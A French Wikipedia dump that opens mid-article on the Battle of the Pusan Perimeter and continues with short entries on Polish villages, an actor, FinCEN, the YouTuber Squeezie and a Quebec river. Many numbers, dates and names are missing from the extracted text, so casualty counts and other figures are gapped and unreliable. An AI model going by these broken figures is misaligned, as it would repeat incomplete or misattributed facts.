La grande offensive du Nakdong est l'un des combats les plus brutaux de la guerre de Corée. Les Nord-Coréens réussissent initialement à percer les lignes de l'ONU à plusieurs endroits et font des gains substantiels et repoussent les unités de l'ONU. Les 4 et 5 septembre, la situation est si désastreuse pour les troupes de l'ONU que la américaine et l'armée sud-coréenne déplace leurs quartiers généraux de Daegu à Busan pour leurs éviter d'être débordé et de perdre leur équipement de communication, mais Walker reste à Daegu avec un petit détachement avancé. L'ONU prépare également sa logistique en prévision d'une retraite sur un plus petit périmètre défensif appelé ligne Davidson. Cependant, le 6 septembre, Walker estime que la retraite n'est pas nécessaire.
L'offensive en cinq volets a conduit à de violents combats autour de Haman, de Kyongju, du Nakdong Bulge, du rivière Nam, de Yongsan, de Tabu-dong et de Ka-san. Les attaques nord-coréennes obtiennent des gains appréciables et forcent les troupes de l'ONU le long du périmètre de Busan à former une fine ligne de défense, en se fondant sur les réserves mobiles pour avoir la force de repousser les attaquants nord-coréens. Du au 8 septembre, le combat est intense et la bataille alors dans l'impasse, est très coûteuse pour les deux armées sur-étendues. Le 15 septembre, cependant, les troupes nord-coréennes sont prises au dépourvu par l'opération Chromite, et ses forces qui sont restées relativement intactes après de combats sont forcées de se retirer dans une déroute totale. Une résistance nord-coréenne isolée perdure jusqu'au 18 septembre, mais à cette date, les troupes de l'ONU montent une offensive à grande échelle pour poursuivre la retraite des unités nord-coréennes vers le Nord, marquant la fin des combats autour du périmètre de Busan.
Conséquences.
Pertes humaines.
Au cours de la bataille, l'ONU et les forces nord-coréennes subissent un nombre élevé de victimes. Du côté américain, le d'infanterie compte , et quatre capturés pendant la bataille. La de cavalerie américaine subit , et 62 capturés. La d'infanterie dénombre , , 67 capturés et 69 disparus. Le d'infanterie souffre de , , cinq capturés et 29 disparus. Le d'infanterie recense , , 1 capturés et 7 disparus. La d'infanterie compte , , quatre capturés et 10 disparus. Avec les autres unités hors division, le nombre de victimes au total de l'US Army pour la bataille est de , , 97 capturés ( en captivité) et 174 disparus, soit un total de . Le Corps des Marines des États-Unis compte , l'US Navy et l'US Air Force . À ce décompte, on peut ajouter , et 12 disparus lors de la contre offensive pour sortir du périmètre. Le décompte officiel des victimes américaines est de , , 2701 disparus, 401 capturés. Le nombre de victimes sud-coréennes est très difficile à établir, mais on estime qu'il est au moins deux fois supérieur au nombre total de victimes de l'ONU, donc au moins . Les États-Unis ont aussi perdu 60 chars dans la lutte, ce qui porte à cette date le nombre total de chars perdus dans la guerre à 136.
Il y a aussi un petit nombre de victimes britanniques lors de la campagne, dont cinq soldats tués. le J.W. Addison est la première victime britannique de la bataille. Il a été tué le 23 août à bord du lorsque le navire a été attaqué par un avion nord-coréen. Le 29 août, le lieutenant commander I. M. MacLachlan, commandant du , a été tué dans un accident d'avion à bord du . En outre, trois soldats britanniques de la ont été tués près de Daegu ; le soldat Reginald Streeter a été tué le 4 septembre, le capitaine C. N. A. Buchanan et le soldat T. Taylor sont morts le 6 septembre. En tout, 17 autres soldats britanniques ont été blessés dans la zone. Deux correspondants de guerre ont été tués dans la campagne, Ian Morrison, un journaliste du Times, et , journaliste pour le Daily Telegraph. Ils ont été tués le 13 août près Waegwan lorsque leur véhicule a heurté une mine terrestre. Un officier des forces armées indiennes a également été tué dans l'incident, le colonel , un représentant de la .
Les victimes nord-coréennes lors de la bataille sont presque impossibles à estimer précisément en raison de l'absence de registres. Il est aussi difficile de déterminer le nombre de citoyens sud-coréens qui ont été enrôlés de force dans la bataille et combien on déserté plutôt que d'être tué. Le nombre des troupes engagées et la violence des combats ont eu pour conséquence la destruction de régiments entiers et même de divisions nord-coréennes, et leur force a dû être estimée sur la base des comptes de Nord-Coréens capturés par l'ONU. Le septembre, l'armée nord-coréenne compte environ en Corée du Sud, et dont un tiers sont sans doute des conscrits sud-coréens. À la suite de la bataille périmètre de Busan, seulement 25000 ou 30000 ces soldats sont retournés en Corée du Nord à la fin du mois de septembre. Plus d'un tiers des soldats de la force est blessé dans les combats. Cela signifie que les pertes nord-coréennes entre le et le 15 septembre oscillent entre 36000 et ou capturés, avec un nombre inconnu de blessés. Avec l'ajout de dans la Bowling Alley, de 3500 dans la bataille du Nakdong, au moins 3700 à Daegu et un nombre inconnu à P'ohang-dong avant le septembre, les pertes totales nord-coréennes sont sans-doute comprises entre 50000 et 60000 sur l'ensemble de la bataille. Les nord-coréens ont également perdu 239 chars T-34 et 74 canons automoteurs SU-76, soit la quasi-totalité des blindés qu'ils possèdent.
Crimes de guerre.
Un certain nombre de crimes de guerre ont été commis des deux côtés du conflit, et les troupes de l'ONU et de la Corée du Nord ont été impliquées dans plusieurs incidents très médiatisés. Les troupes nord-coréennes, en occupant la Corée du Sud, ont été accusées de nombreux cas d'abus envers les prisonniers de guerre capturés pendant les combats. Parmi les plus terribles abus, des prisonniers capturés de l'ONU ont été torturés et exécutés par les troupes nord-coréennes. On rapporte aussi quelques incidents isolés au sujet de prisonniers battus, castrés, brûlés à mort, et utilisés pour des exercices à la baïonnette. Dans la région de Daegu, des groupes de soldats capturés ont été retrouvés exécutés avec les mains liées. On retrouve ces exactions à Masan, où des prisonniers ont été utilisés comme boucliers humains contre d'autres troupes de l'ONU. Les soldats de l'ONU grièvement blessés ont également été achevés, et dans au moins un cas, des aumôniers et des médecins non armés ont été attaqués malgré le port de signes clairement distinctifs. Les Nord-Coréens ont également enrôlé à grande échelle les civils sud-coréens dans leurs armées, tuant tous ceux qui ont tenté de déserter.
Le crime de guerre le plus violent est le massacre de la colline 303, le 17 août, lorsque 41 prisonniers de guerre américains sont tués par les Nord-Coréens près de Daegu. Ce crime a conduit le commandant des forces de l'ONU, Douglas MacArthur à avertir les Nord-Coréens par le biais de prospectus et d'émission qu'ils seraient tenus pour responsables de ces crimes. Les historiens conviennent qu'il n'y a pas de preuves que le haut-commandement nord-coréen ait sanctionné l'exécution de prisonniers pendant la première phase de la guerre. Le massacre de la colline 303 et de semblables atrocités ont sans doute été menés par de petites unités non contrôlées, par des individus vindicatifs, ou en raison des situations défavorables et de plus en plus désespérées. , un historien militaire, a écrit dans son analyse de l'événement que les troupes nord-coréennes commettant ces actes ont probablement été habituées à la torture et à l'exécution de prisonniers en raison d'une décennie d'oppression par l'empire du Japon jusqu'à la fin de la Seconde Guerre mondiale. Les commandants nord-coréens ont publié des ordres plus stricts quant au traitement de prisonniers de guerre après ces incidents, bien que de telles atrocités se soient poursuivies.
Les troupes de l'ONU, en particulier sud-coréennes, ont également été accusées d'avoir tué ou tenté de tuer des prisonniers nord-coréens. Les civils sud-coréens, dont certains étaient des sympathisants de gauche ou communistes, ont été systématiquement emprisonnés ou tués lors des massacres de la ligue Bodo, dont certains ont eu lieu au cours de la bataille du périmètre. Dans les années qui ont suivi la bataille, des preuves ont également fait surface indiquant que l'armée américaine a tué des civils sud-coréens peu de temps avant le début des combats pour le périmètre de Busan, craignant l'infiltration de Nord-coréens, notamment lors du massacre de No Gun Ri. Les preuves sont débattues, mais plusieurs livres ont été publiés sur la question.
Médaille d'honneur.
La Medal of Honor a été attribuée à américains lors de la bataille du périmètre de Busan. Le major de l'US Air Force est la seule personne de cette arme à recevoir la médaille. Dans les rangs de l'US Army, on compte le sergent-chef , le soldat de première classe , le caporal , le soldat de première classe , le , le sergent-chef , le premier-lieutenant , le soldat de première classe , le sergent première classe , le soldat de première classe , le sergent première classe et le soldat de première classe . Le sergent et le caporal ont également reçu la médaille lors de l'offensive qui a suivi. Un des militaires du Commonwealth a été récompensé par la croix de Victoria durant cette offensive, le major .
Implications.
Certains historiens soutiennent que les objectifs de la Corée du Nord lors de la bataille du périmètre de Busan sont dès le début, inaccessibles. Selon l'historien , les Américains, qui sont mieux équipés que les Nord-Coréens, sont facilement en mesure de vaincre leurs adversaires après la formation d'une ligne continue de défense. Dans le même temps, les Nord-Coréens percent le périmètre en plusieurs points et sur un court laps de temps tentent de conserver l'avantage. En une semaine, cependant, l'élan de l'offensive est scié, les Nord-Coréens ne pouvant maintenir la puissance de leur attaque.
Le débarquement d'Incheon est un coup terrible pour l'armée nord-coréenne. Il prend complètement au dépourvu des forces déjà affaiblies par l'offensive le long du périmètre. Avec pratiquement aucun équipement, des hommes épuisés et le moral bas, les forces nord-coréennes sont dans une situation désavantageuse et ne sont pas en mesure de continuer à faire pression sur le périmètre de Busan, tout en tentant de repousser le débarquement à Incheon. Le 23 septembre, les Nord-Coréens effectuent une pleine retraite du périmètre. Les forces de l'ONU s'élancent alors rapidement vers le Nord à leur poursuite afin de reprendre le terrain perdu avant la bataille du périmètre de Busan.
La destruction de l'armée nord-coréenne à Busan rend impossible la poursuite de la guerre par les communistes avec les seules troupes nord-coréennes. Les pertes massives en hommes et en matériel rivalisent avec les pertes de l'armée sud-coréenne aux premiers stades du conflit. Les Nord-Coréens se sont totalement effondrés comme force de combat. Ce qui reste de leur armée en déroute s'est retiré en Corée du Nord en opposant qu'une très faible résistance aux forces de l'ONU. Cette dernière, maintenant à l'offensive, dispose à ce moment d'une supériorité écrasante sur terre, air et mer. Beaucoup des unités nord-coréennes se sont tout simplement rendues, après avoir été réduites de plusieurs milliers à quelques centaines d'hommes.
Avec la victoire au périmètre de Busan, MacArthur et les chefs d'état-major, poussés par les dirigeants américains à Washington, décident de poursuivre agressivement les restes de l'armée nord-coréenne jusqu'en Corée du Nord. La des États-Unis reçoit l'ordre d'avancer aussi loin au nord que possible en direction de la Mandchourie et de la frontière entre la Corée du Nord et la Chine, avec pour principal objectif de détruire ce qui reste de l'armée de Corée du Nord et pour objectif secondaire de réunir toute la Corée sous l'autorité de Syngman Rhee. Mais la Chine, qui avait menacé de ne pas rester à l'écart si les et les avertissements d'autres nations à ne pas franchir le sont restés lettre morte. Après le refus de la Corée du Nord de se rendre, MacArthur lance l'offensive initialement connue comme . Cette dernière entraine l'intervention chinoise au moment où les troupes de l'ONU atteignent le fleuve Yalou et la poursuite de la guerre durant encore deux années et demie.

</doc>
<doc id="9412986" url="https://fr.wikipedia.org/wiki?curid=9412986" title="Januszewo (Kościan)">
Januszewo (Kościan)

Januszewo (prononciation : ) est un village polonais de la gmina de Kościan dans le powiat de Kościan de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ au sud-est de Kościan (siège de la gmina et du powiat) et à au sud de Poznań (capitale régionale).
Le village possédait une population de en 2011.
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Leszno.&lt;br&gt;
Depuis 1999, Januszewo est situé dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9412992" url="https://fr.wikipedia.org/wiki?curid=9412992" title="Katarzynin">
Katarzynin

Katarzynin (prononciation : ) est un village polonais de la gmina de Kościan dans le powiat de Kościan de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ au sud-est de Kościan (siège de la gmina et du powiat) et à au sud de Poznań (capitale régionale).
Le village possédait une population de en 2005.
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Leszno.&lt;br&gt;
Depuis 1999, Katarzynin est situé dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9413002" url="https://fr.wikipedia.org/wiki?curid=9413002" title="Alex Waltz">
Alex Waltz

Alexis Vésigot-Wahl, dit Alex Waltz, est un acteur et auteur dramatique français né le à Paris.
Biographie.
Après avoir exercé différents métiers, Alex Waltz se consacre à la comédie en 1995, à l'âge de 30 ans. Il fait ses premières armes à la télévision en jouant dans des sketchs en caméra cachée, notamment pour les émissions des animateurs Patrick Sébastien et Fabrice. En 1996, il obtient son premier rôle dans la série "Les Cordier, juge et flic", dans laquelle il jouera deux saisons ( et ). Acteur mineur de télévision, il apparaît dans de nombreuses séries policières, le plus souvent dans des rôles secondaires.
On a pu le voir également dans des publicités (SNCF, McDonald's). La pièce "Des Poissons dans les arbres"(dont il est l'auteur sous son nom patronymique, Alexis Vésigot-Wahl) remporte en 2012 un succès critique et reste huit mois à l'affiche, à Paris, au Théâtre Essaïon. Parallèlement à son métier de comédien, il exerce une activité de coach et dispense des cours de formation à l'expression en public.
Vie privée.
Il a deux enfants, Jules et Niels, nés respectivement en 2000 et 2004.

</doc>
<doc id="9413004" url="https://fr.wikipedia.org/wiki?curid=9413004" title="Kawczyn (Kościan)">
Kawczyn (Kościan)

Kawczyn (prononciation : ) est un village polonais de la gmina de Kościan dans le powiat de Kościan de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ au nord-est de Kościan (siège de la gmina et du powiat) et à au sud-ouest de Poznań (capitale régionale).
Le village possédait une population de en 2011.
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Leszno.&lt;br&gt;
Depuis 1999, Kawczyn est situé dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9413022" url="https://fr.wikipedia.org/wiki?curid=9413022" title="Kiełczewo">
Kiełczewo

Kiełczewo (prononciation : ) est un village polonais de la gmina de Kościan dans le powiat de Kościan de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ au nord de Kościan (siège de la gmina et du powiat) et à au sud-ouest de Poznań (capitale régionale).
Le village possédait une population de en 2011.
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Leszno.&lt;br&gt;
Depuis 1999, Kiełczewo est situé dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9413023" url="https://fr.wikipedia.org/wiki?curid=9413023" title="Financial Crimes Enforcement Network">
Financial Crimes Enforcement Network

Le Financial Crimes Enforcement Network (FinCEN) est un bureau du département du Trésor des États-Unis qui collecte et analyse les informations sur les transactions financières afin de lutter contre le blanchiment d'argent national et international, le financement du terrorisme et d'autres crimes financiers.
Histoire.
Le FinCEN a été créé par un arrêté du Secrétaire au Trésor (Ordre du Trésor numérotée de 105 à 08) le . En , sa mission a été élargie pour inclure les responsabilités réglementaires, et en , le précurseur du Département du Trésor et le bureau d'exécution financière ont fusionné avec le FinCEN. Le , après l'adoption du titre III du Patriot Act, l'ordre du Trésor 180-01 a un bureau officiel dans le département du Trésor.
En , la technologie de l'information du FinCEN appelé "FinCEN Portal and Querry System" a migré avec 11 années de données dans le "FinCEN Query", un moteur de recherche similaire à Google. Depuis septembre 2012 le FinCEN génère 4 nouveaux rapports : le "Suspicious Activity Report" (ou "FinCEN SAR"), le "Currency Transaction Report" (ou "FinCEN CTR"), le "Designation of Exempt Person" (ou "DOEP") et le "Registered Money Service Business" (ou "RMSB")
Mission.
Le directeur du FinCEN a exprimé sa mission en qui est de "". Le FinCEN sert d'unité américaine de renseignements financiers et compose aussi le Egmont Group of Financial Intelligence Units. Le site affirme que le motif principal des criminels est un gain financier donc qu'ils laissent des traces financières quand ils essaient de blanchir le produit de leurs crimes ou de tenter d'écouler leurs profits mal acquis.
Organisation.
En novembre 2013, le FinCEN employait environ 340 personnes pour la plupart des professionnels du renseignement ayant une expertise dans l'industrie financière, la finance illicite, l'intelligence financière, le blanchiment d'argent, le financement du terrorisme, le régime de réglementation, la technologie informatique et de l'application. La majorité du personnel sont des membres permanents du FinCEN. Il y a des dizaines d'agences de renseignement, y compris le bureau de l'alcool, du tabac et des armes à feu. le "Drug Enforcement Administration", le "Federal Bureau of Investigation", l"'Internal Revenue Service", le service des douanes et le service postal de l'inspection des États-Unis.
314 Program.
Le USA PATRIOT Act de 2001 a permis la création d'un réseau sécurisé pour la transmission de l'information pour faire respecter les règlements pertinents. Les règlements du FinCEN vertu de l'article 314(a) permet aux organismes l'application de la loi fédérale eandant la main à plus de points de contact à plus de institutions financières pour localiser les comptes et les transactions de personnes qui pourraient être impliquées dans le financement du terrorisme et/ou le blanchiment d'argent. Le partenariat entre la communauté et l'application de la loi financière permet à des informations disparates d'être identifiées, centralisées et évaluées rapidement.
Hawala.
Dès 2003, le FinCEN a diffusé des informations sur les (ou IVTS), y compris les Hawala, un réseau de personnes qui reçoivent de l'argent dans le but de rendre les fonds payables à un tiers dans un autre emplacement géographique, généralement en dehors du système bancaire classique à travers les institutions financières non bancaires ou autres entités commerciales dont l'activité principale ne peut pas être la transmission de l'argent.
Monnaies virtuelles.
En , le FinCEN ajouté une à sa définition d'entreprises de services monétaires dans la préparation d'adapter la règle respective aux monnaies virtuelles. Le , le FinCEN a émis des directives interprétatives concernant les monnaies virtuelles, selon laquelle, les échangeurs et les administrateurs, mais pas les utilisateurs de la monnaie virtuelle convertible sont considérés comme des émetteurs d'argent, et doit se conformer aux règles pour empêcher le blanchiment d'argent, le financement du terrorisme et d'autres formes de criminalité financière.
En novembre 2013, Calvery a déclaré en audience au Sénat : contrastant l'affaire de Bitcoin lors d'un contournement du système de fichiers des institutions financières des entreprises. Elle a déclaré que le FinCEN collabore avec le Federal Financial Institutions Examination Council. Selon le département de la Justice, les membres représentent le FBI, la Drug Enforcement Administration, de multiples avocat américain et les confiscation d'actifs des criminels de la Chambre criminelle, le blanchiment d'argent et les crimes de la propriété intellectuelle et de l'informatique.
Transparence des entreprises.
En 2020, les États-Unis adoptent le Corporate Transparency Act. Cette loi impose aux propriétaires de sociétés écrans de révéler leur identité au FinCEN. Le Trésor et les forces de l’ordre auront accès à ces informations pour lutter contre le blanchiment d'argent et l'évasion fiscale.
Controverses.
Il a été allégué que les règlements du FinCEN contre structuration sont appliquées injustement et arbitrairement, par exemple, il a été signalé en 2012 que les petites entreprises qui vendent à des marchés de producteurs ont été leur cible, tandis que les personnes connectées politiquement comme Eliot Spitzer n'ont pas été poursuivis.
En 2009, le GAO note que les régulateurs bancaires fédéraux ont émis un manuel d'examen inter-agences, que la SEC, la CFTC et leurs organismes d'auto-réglementation respectifs développés les modules de l'examen et que le FinCEN et l'IRS examinant les institutions financières non bancaires ont émis un manuel d'examen pour les entreprises de services monétaires. Par conséquent plusieurs régulateurs examinent la conformité des BSA entre les industries et pour certaines grandes sociétés de portefeuille, même au sein de la même institution. Les régulateurs se doivent de promouvoir une plus grande cohérence, la coordination et le partage d'informations, de réduire le fardeau réglementaire inutile, et de trouver des préoccupations dans toutes les industries. Le FinCEN a estimé que cela conduira à des accords d'accès aux données avec des organismes d'État qui effectuent des examens de BSA depuis 2012.
Les avantages du FinCEN par rapport à sa menace contre la vie privée ont été débattues par l'Electronic Frontier Foundation à San Francisco depuis la création du FinCEN en 1990. Sa valeur est difficile à évaluer sans publication de preuves : le FinCEN ne divulgue pas combien d'activités suspectes découlent directement des enquêtes, ni les inculpations ou les condamnations, et aucune étude existent pour comptabiliser le nombre de rapports qui sont déposés envers les personnes innocentes.

</doc>
<doc id="9413028" url="https://fr.wikipedia.org/wiki?curid=9413028" title="Squeezie">
Squeezie

Squeezie, né le à Vitry-sur-Seine (Val-de-Marne), est un vidéaste, streameur, influenceur et entrepreneur français.
Comptant d'abonnés en , il est le second vidéaste web francophone le plus suivi derrière Tibo InShape, après s'être maintenu en première position du classement pendant cinq ans.
Depuis les années 2010, il propose sur YouTube un contenu divertissant et est présent sur Twitch où il compte plus de d'abonnés à l'été 2024. Il publie son contenu "let's play" ainsi que diverses vidéos sur des chaînes secondaires.
Avec des moyens financiers et techniques de plus en plus importants au sein de ses productions, mais également à travers l'accroissement de la reconnaissance et de la notoriété des influenceurs au fil de sa carrière, Squeezie devient une personnalité française notoire. Il lance avec son frère, en 2019, sa marque de vêtements Yoko, et en 2022, avec la collaboration de Gotaga et Brawks, une structure esport baptisée Gentle Mates. Il est aussi actif dans le monde de la musique, avec la publication de son premier album "Oxyz" (2020) puis de plusieurs singles et EP. En 2022, il devient ainsi le premier influenceur web à disposer d'une statue à son effigie au musée Grévin.
Biographie.
Enfance.
Lucas Adrien Hauchard naît le à Vitry-sur-Seine, dans le Val-de-Marne. Il grandit à Antony, dans les Hauts-de-Seine.
Débuts sur YouTube.
Il se lance sur YouTube en avec une première chaîne spécialisée sur le jeu "Dofus", qu'il nomme "Dofusbouclier". Cette chaîne, inactive depuis , compte deux vidéos. En , il crée une autre chaîne, "TheVideobc2", inactive depuis le , qui compte trois vidéos et a également pour thématique le jeu vidéo.
Le , il crée sa chaîne actuelle sur YouTube sous le pseudonyme de "Squeezie", en référence au morceau "Squeeze it" de Tiësto et DJ Frank E. Concentrée sur des tests de jeux vidéo, cette chaîne atteint une notoriété assez élevée, faisant de lui à cette période le plus jeune Français à dépasser le million d'abonnés sur YouTube, à l'âge de .
Carrière sur Internet.
En , alors qu'il a un demi-million d'abonnés, il s'associe avec le youtubeur français Cyprien pour créer la chaîne "CyprienGaming" ("Bigorneaux &amp; Coquillages" depuis ), elle-aussi spécialisée dans les jeux vidéo.
Il apparaît dans la vidéo "YouTube Rewind 2015", une vidéo créée par YouTube réunissant les vidéastes et personnalités d'Internet qui ont marqué l'année.
En 2017, il participe à l'émission "Fort Boyard", en compagnie de Cyprien. En cette même année, il coécrit avec Maxenss "Tourne la page", un ouvrage paru chez Michel Lafon.
Le , Squeezie interprète "Roméo et Juliette" de William Shakespeare avec Cyprien, Mcfly et Carlito et Leopold (anciennement Le Pérave) au casino Barrière d'Enghien devant 500 personnes. Cette représentation théâtrale est organisée à la suite d'une compétition perdue par Cyprien et Squeezie contre Mcfly et Carlito en octobre de l'année précédente. La pièce est rediffusée en direct sur Twitch et bat le record du stream avec en simultané pour un total de .
En , il quitte Webedia et crée l'agence de communication « Bump ».
Pendant deux semaines, à partir du , Squeezie anime une émission de radio sur la tranche horaire - , où il parle de musique, d'humour et de jeux vidéo avec des invités et des auditeurs.
Début 2022, il publie le premier tome d'une bande dessinée sur le thème de l'horreur, "Bleak", co-écrite avec Guillaume Natas et Laurene « Luciole » Arnoux et le second sort le .
Le , il devient le premier vidéaste web à avoir sa statue, accompagnée de son chien Natsu, au musée Grévin. Ce shiba inu est l'objet d'un compte Instagram dédié où il est suivi par plus de .
En , une série documentaire de cinq épisodes sur son parcours est diffusée sur Prime Video. Réalisée par son complice Théodore Bonnet, "Merci Internet" retrace la vie de Squeezie de son enfance à son ascension sur le web.
Carrière musicale.
Après plusieurs clips parodiques postés sur YouTube, culminant parmi ses vidéos les plus vues, Squeezie se lance officiellement dans le rap en 2020. Il signe chez et sort son premier projet en janvier, "Influenceurs". Son premier album, intitulé "Oxyz", sort le . L'enregistrement s'est entièrement fait au Japon, un pays apprécié par l'artiste. Il contient deux "featurings" avec les rappeurs Némir et Gambi, les deux titres faisant chacun l'objet d'un clip avant la sortie de l'album.
Diversification des activités.
Streaming.
Après un début principalement centré sur YouTube, Squeezie se dirige vers Twitch, une plateforme de diffusion en direct. La chaîne est d'abord baptisée « SqueezieLive » avant d'être renommé au même nom que son créateur. En , il lance en partenariat avec l'agence d'influence Webedia le média LeStream, une Web TV dont l'objectif principal est le divertissement via des talk-shows et la diffusion de quelques évènements spéciaux comme "Qui veut gagner des Bitcoins", la "keynote" annuelle d'Apple ou encore des forums de jeux vidéo.
Comme sur Youtube, Squeezie bat rapidement des records de statistiques sur Twitch. Depuis 2022, il est le streamer français ayant le plus d'abonnés devant Gotaga et est aussi le détenteur du record français de spectateurs en simultanés avec un peu plus d'un million lors du GP Explorer 2022, battant de loin le précédent record qu'avait établi ZeratoR. Il rebat son propre record en 2023 dans la seconde édition du GP Explorer.
Marque de vêtements.
Le , il lance sa marque de vêtements Yoko, , créée avec son frère aîné Florent Hauchard. Le , la marque ferme ses portes.
GP Explorer.
Au cours de la quatrième édition du Z Event, Squeezie propose comme objectif de don un « tournoi IRL de Formule Renault » si la cagnotte atteint durant l'événement. Le , il présente, lors d’un live sur Twitch, les détails de son projet, baptisé GP Explorer.
La première édition du GP Explorer se tient le sur le circuit Bugatti du Mans. Elle réunit 22 streameurs et vidéastes web français, répartis en onze équipes. Cet événement rencontre un succès populaire, avec présents sur le circuit, plus d'un million de spectateurs en simultané lors de sa diffusion sur Twitch et plus de 12,5 millions de vues cumulées.
Squeezie anime une deuxième édition du GP Explorer le sur le même circuit, qui fait s'affronter 24 streameurs et vidéastes web francophones répartis en 12 écuries, dont les rappeurs SCH, Soso Maness et Kekra.
Du au se tient une .
Gentle Mates : Structure d'esport.
Le , Squeezie, Gotaga et Brawks dévoilent la création de leur structure esport baptisée Gentle Mates, principalement axée sur Valorant.
Ciao Kombucha.
En mai 2025, il lance une marque de boisson de kombucha, baptisée Ciao Kombucha.
Vie privée.
De 2012 à 2015, Squeezie est en couple avec la vidéaste Gwendoline Asquin, dite Sweetie ou Gwenn.
De 2015 à 2017, il est en couple avec l'animatrice Marie Palot.
Depuis 2022, il est en couple avec Chloé Gervais.
Croissance sur YouTube.
En , selon Social Blade, Lucas Hauchard est le Français le plus populaire sur YouTube, devant "", Cyprien, Rémi Gaillard et Norman. Fin 2014, le même site Internet déclare que les vidéos de "Squeezie" sont vues de fois, soit plus que Rémi Gaillard, Norman et Cauet réunis.
Il culmine à plus de abonnés gagnés lors de l'année 2017 et ajoute plus d'un milliard de vues à son compteur.
En , il dépasse Norman en nombre d'abonnés, puis Cyprien un an après, devenant le premier vidéaste francophone en nombre d'abonnés.
Le , il est détrôné par Tibo InShape, qui devient le youtubeur francophone le plus suivi avec 18,92 millions d'abonnés contre 18,91 millions pour Squeezie.
Prises de position politiques.
En , en vue des élections législatives françaises de 2024, il appelle à voter contre le parti d'extrême droite du Rassemblement national, déclarant que . C'est la première fois que Squeezie prend la parole de cette façon et s'engage politiquement car pour lui . Jordan Bardella lui répond en lui reprochant de reprendre les arguments de La France insoumise et en attribuant sa position notamment au fait qu'il s'est . Six heures après sa diffusion, son message compte près de 1,2 million de likes, son nombre d'abonnés sur Instagram augmente d'une centaine de milliers et baisse du même nombre sur YouTube.
Controverses.
Cyberharcèlement après la publication d'une vidéo.
En , il déclare avoir été contacté par une association contre le cyberharcèlement à la suite de la publication d'une vidéo où il réagissait à des vidéos le mettant mal à l'aise. Une fille se trouvant dans la vidéo ayant subi du cyberharcèlement, la mère de cette dernière avait contacté l'association. À la suite de cela, Squeezie retire la vidéo, s'estimant fautif d'avoir entretenu le harcèlement, bien que la vidéo à laquelle il réagissait eût déjà fait le buzz avant que lui-même ne l'évoque. Il en profite pour sensibiliser son public au cyberharcèlement.
Squeezie et Thierry Ardisson.
En , il publie son premier livre, "Tourne la page", édité chez Michel Lafon. Lors d'une interview sur le plateau de "Salut les Terriens !", le présentateur Thierry Ardisson est au centre d'une polémique, à la suite de son interview de Squeezie, jugée fortement .
#BalanceTonPorc.
Le , Squeezie dénonce dans un tweet les pratiques de certains youtubeurs qui useraient de leur notoriété pour abuser de jeunes abonnées. Un mouvement suit, alimenté par un article du "Parisien" qui donne des noms et génère le hashtag sur Twitter #BalanceTonYoutuber, semblable à celui du mouvement #BalanceTonPorc. Squeezie regrette quelque temps plus tard mais réitère son soutien aux victimes de ces pratiques.
Impact environnemental de ses activités.
Selon le site d’analyse "Arrêt sur images", qui se consacre à la déconstruction des narrations médiatiques, le GP Explorer est . Le site relève que la course a surtout été traitée par deux angles par la presse : l’importance du record d’audience et la place grandissante de la plateforme Twitch, comparée à la « télé des jeunes ». Cependant, l’impact écologique de cette compétition est largement mis de côté par les médias. "Charlie Hebdo" titre son article au sujet du GP Explorer « Les des cons » et rapporte les critiques diffusées sur les réseaux sociaux une fois l’événement terminé. Parmi les 22 personnalités, au moins 3 ont en effet participé au Z Event 2022 : LeBouseuh, Xari et Domingo.
En 2023, Squeezie est critiqué à nouveau sur son impact environnemental après la publication d'une vidéo dans laquelle il offre de voyage internationaux à ses abonnés. Le journaliste indépendant Bon Pote déclare par exemple sur X : ; le tweet a été lu plus d'un million de fois.
Revenus.
En 2016, "Les Inrockuptibles" révèlent la vente de Mixicom à Webedia. Squeezie étant associé de Talent Web, ce dernier devient multi-millionnaire à 19 ans en obtenant de cette vente la somme d'environ 4 millions d'euros, confirmée plus tard par ce dernier lors d'une émission sur Twitch.
Il est difficile d'estimer précisément les revenus générés par les différentes activités de Squeezie tant elles sont fluctuantes, nombreuses et les montants des revenus discrètement préservés. L'influenceur a déclaré à plusieurs reprises de ses activités.
Filmographie.
Internet.
Jeu "Qui est l'imposteur ?".
En juin 2022, Squeezie lance sur sa chaîne le jeu "Qui est l'imposteur ?", inspiré d'un format du youtubeur américain , lui même inspiré du jeu télévisé . Squeezie, accompagné de deux personnalités invités, voient défiler trois personnes qui partagent quelque chose en commun (métier, passion). Dans chaque manche, l'une des trois personnes se trouve être un "imposteur", étant le complice de Squeezie ou d'un des invités. Le but du jeu est de démasquer l'imposteur avec son complice durant chacune des quatre manches.

</doc>
<doc id="9413029" url="https://fr.wikipedia.org/wiki?curid=9413029" title="Kobylniki (Kościan)">
Kobylniki (Kościan)

Kobylniki (prononciation : ) est un village polonais de la gmina de Kościan dans le powiat de Kościan de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ à l'ouest de Kościan (siège de la gmina et du powiat) et à au sud-ouest de Poznań (capitale régionale).
Le village possédait une population de en 2009.
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Leszno.&lt;br&gt;
Depuis 1999, Kobylniki est situé dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9413067" url="https://fr.wikipedia.org/wiki?curid=9413067" title="Petite rivière Noire (rivière Saint-François)">
Petite rivière Noire (rivière Saint-François)

La Petite rivière Noire est un tributaire de la rivière Saint-François. Elle coule vers le nord-ouest dans les municipalités de Saint-Bonaventure et de Saint-Pie-de-Guire, dans la municipalité régionale de comté (MRC) de Drummond, dans la région administrative du Centre-du-Québec, sur la Rive-Sud du fleuve Saint-Laurent, au Québec, Canada.
Géographie.
Les principaux bassins versants voisins de la Petite rivière Noire sont:
La Petite rivière Noire prend sa source dans une petite zone forestière à l'est du village de Saint-Bonaventure, à au sud-est de la rue Principale, à au sud-ouest de la rivière Saint-François et au nord-ouest de la ville de Drummondville. Cette zone de tête est située dans le secteur Grantham-Ouest, au nord de l'autoroute 20 et à l'ouest de la ville de Drummondville.
